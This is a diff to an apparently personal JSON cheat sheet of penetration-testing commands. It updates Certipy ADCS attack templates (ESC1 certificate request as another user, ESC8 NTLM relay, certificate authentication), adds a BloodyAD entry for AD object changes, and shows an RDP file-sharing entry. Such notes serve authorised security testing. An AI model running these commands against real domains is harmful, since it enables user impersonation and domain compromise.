@@ -313,7 +313,7 @@
         "section": "active-directory",
         "title": "Certipy",
         "description": "ADCS Attacks",
-        "command": "# Enumerate templates\ncertipy find -u '{{ldap_bind}}' -p '{{password}}' -dc-ip {{dc_ip}}\n\n# ESC1 - Enrollee supplies subject\ncertipy req -u '{{ldap_bind}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca_name}}' -template '{{cert_template}}' -upn '{{target_user}}@{{domain}}'\n\n# ESC4 - Consultar configuração do template (sem modificar ACL)\ncertipy template -u '{{ldap_bind}}' -p '{{password}}' -template '{{cert_template}}' -save-configuration template-backup.json\n\n# ESC8 - NTLM relay to ADCS HTTP\ncertipy relay -target 'http://{{ca_host}}' -template '{{cert_template}}'\n\n# Authenticate with certificate (PKINIT deve ser suportado pelo ambiente)\ncertipy auth -pfx '{{pfx_file}}' -dc-ip {{dc_ip}}"
+        "command": "# Enumerate templates\ncertipy-ad find -u '{{ldap_bind}}' -p '{{password}}' -dc-ip {{dc_ip}}\n\n# ESC1 - Enrollee supplies subject\ncertipy-ad req -u '{{ldap_bind}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca_name}}' -template '{{cert_template}}' -upn '{{target_user}}@{{domain}}'\n\n# ESC4 - Consultar configuração do template (sem modificar ACL)\ncertipy-ad template -u '{{ldap_bind}}' -p '{{password}}' -template '{{cert_template}}' -save-configuration template-backup.json\n\n# ESC8 - NTLM relay to ADCS HTTP\ncertipy-ad relay -target 'http://{{ca_host}}' -template '{{cert_template}}'\n\n# Authenticate with certificate (PKINIT deve ser suportado pelo ambiente)\ncertipy-ad auth -pfx '{{pfx_file}}' -dc-ip {{dc_ip}}"
       },
       {
         "id": "custom-1793557530805-8lnfz5",
@@ -776,8 +776,15 @@
         "title": "RDP",
         "description": "Conectar via RDP e enviar arquivos.",
         "command": "# Conectar via RDP (TCP 3389)\nxfreerdp3 /v:{{ip}} /u:'{{username}}' /p:'{{password}}' /d:'{{domain}}' /cert:ignore +dynamic-resolution\n\n# Criar share via RDP\nxfreerdp3 /v:{{ip}} /u:'{{username}}' /p:'{{password}}' /d:'{{domain}}' /cert:ignore +dynamic-resolution /drive:\"{{share_name}},{{pasta_compartilhada_kali}}\n# Dentro da sessão RDP, abra o explorador de arquivos e digite:\n\\\\tsclient\\share"
+      },
+      {
+        "id": "custom-1795127644740-zh0tfi",
+        "section": "active-directory",
+        "title": "BloodyAD",
+        "description": "Ver as opções do bloodyad",
+        "command": "bloodyad -d {{domain}} -u {{username}} -p '{{password}}' -H {{dc_domain}} -i {{dns_server}} -h\n\n# para usar opções como set password, add groupmember, get writeable"
       }
     ]
   },
-  "exportedAt": "2026-11-01T20:00:07.349Z"
+  "exportedAt": "2026-11-19T22:40:17.042Z"
 }
